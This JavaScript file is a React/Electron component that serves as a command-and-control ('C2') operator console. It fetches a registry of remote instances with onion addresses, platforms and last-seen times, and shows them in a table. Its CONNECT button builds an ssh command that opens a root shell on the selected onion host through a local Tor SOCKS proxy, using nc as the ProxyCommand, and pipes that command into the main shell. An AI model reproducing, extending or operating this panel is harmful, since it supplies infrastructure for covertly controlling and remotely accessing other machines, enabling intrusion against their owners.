import React, { useState, useEffect } from 'react';

const ipcRenderer = (typeof window !== 'undefined' && window.electronAPI)
    ? window.electronAPI.ipcRenderer
    : { invoke: async () => [] };

const MasterConsole = () => {
    const [instances, setInstances] = useState([]);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');

    const fetchRegistry = async () => {
        setLoading(true);
        setError('');
        try {
            // We use the AI command bridge to query the C2 registry via a local python helper
            const result = await ipcRenderer.invoke('ai.command', 'internal.c2_list');
            const data = JSON.parse(result);
            if (Array.isArray(data)) {
                setInstances(data);
            } else {
                setError('FAILED TO PARSE C2 DATA');
            }
        } catch (err) {
            setError('C2 REGISTRY OFFLINE OR UNREACHABLE');
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        fetchRegistry();
    }, []);

    const containerStyle = {
        padding: '20px',
        color: '#00ff00',
        height: '100%',
        display: 'flex',
        flexDirection: 'column',
        gap: '20px'
    };

    const tableStyle = {
        width: '100%',
        borderCollapse: 'collapse',
        background: 'rgba(0,10,0,0.3)'
    };

    const thTdStyle = {
        border: '1px solid #005500',
        padding: '12px',
        textAlign: 'left',
        fontSize: '12px'
    };

    const connectToInstance = (onion) => {
        const cmd = `ssh -o "ProxyCommand=nc -X 5 -x 127.0.0.1:9050 %h %p" root@${onion}`;
        ipcRenderer.send('terminal.keystroke', `${cmd}\r`);
        alert('CONNECTION STRING PIPED TO MAIN_SHELL');
    };

    return (
        <div style={containerStyle}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid #00ff00', paddingBottom: '10px' }}>
                <h2 style={{ margin: 0, letterSpacing: '2px' }}>GLOBAL INSTANCE REGISTRY [C2]</h2>
                <button 
                    onClick={fetchRegistry}
                    style={{ background: 'transparent', border: '1px solid #00ff00', color: '#00ff00', padding: '5px 15px', cursor: 'pointer' }}
                >
                    REFRESH_NODES
                </button>
            </div>

            {error && <div style={{ color: '#ff0000', border: '1px solid #ff0000', padding: '10px' }}>&gt; {error}</div>}

            <div style={{ flex: 1, overflowY: 'auto' }}>
                <table style={tableStyle}>
                    <thead>
                        <tr style={{ background: '#003300' }}>
                            <th style={thTdStyle}>INSTANCE_ID</th>
                            <th style={thTdStyle}>ONION_UPLINK</th>
                            <th style={thTdStyle}>PLATFORM</th>
                            <th style={thTdStyle}>LAST_SEEN</th>
                            <th style={thTdStyle}>ACTIONS</th>
                        </tr>
                    </thead>
                    <tbody>
                        {instances.map((node, i) => (
                            <tr key={node.id} style={{ background: i % 2 === 0 ? 'rgba(0,0,0,0.5)' : 'transparent' }}>
                                <td style={thTdStyle}>{node.id}</td>
                                <td style={{...thTdStyle, color: '#00aa00'}}>{node.onion}</td>
                                <td style={thTdStyle}>{node.metadata?.platform || 'UNKNOWN'}</td>
                                <td style={thTdStyle}>{new Date(node.last_seen).toLocaleString()}</td>
                                <td style={thTdStyle}>
                                    <button 
                                        onClick={() => connectToInstance(node.onion)}
                                        style={{ background: '#00ff00', color: '#000', border: 'none', padding: '2px 10px', fontWeight: 'bold', cursor: 'pointer' }}
                                    >
                                        CONNECT
                                    </button>
                                </td>
                            </tr>
                        ))}
                        {instances.length === 0 && !loading && (
                            <tr>
                                <td colSpan="5" style={{...thTdStyle, textAlign: 'center', padding: '40px'}}>NO ACTIVE NODES DETECTED IN GRID.</td>
                            </tr>
                        )}
                    </tbody>
                </table>
            </div>
        </div>
    );
};

export default MasterConsole;
